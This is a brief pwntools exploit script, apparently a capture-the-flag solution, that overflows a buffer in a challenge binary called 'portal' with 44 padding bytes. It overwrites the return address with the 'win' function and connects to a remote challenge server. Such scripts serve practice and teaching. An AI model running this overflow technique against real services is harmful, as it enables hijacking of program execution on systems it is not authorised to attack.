from pwn import *

elf = ELF("./portal")

#io = process("./portal")
io = remote("0.cloud.chals.io", 11723)

payload = b"".join([
    b"A"*44,
    p64(elf.sym.win)
])

io.sendline(payload)
io.interactive()